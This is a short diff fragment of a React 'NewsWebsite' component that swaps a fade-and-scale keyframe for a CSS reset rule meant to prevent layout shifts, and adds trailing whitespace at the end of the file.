-          from { opacity: 0; transform: scale(0.9); }
-          to { opacity: 1; transform: scale(1); }
+
+        /* Prevent layout shifts */
+        * {
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
         }
       `}</style>
     </div>
@@ -1408,3 +1417,4 @@ const NewsWebsite = () => {
 };
 
 export default NewsWebsite;
+   
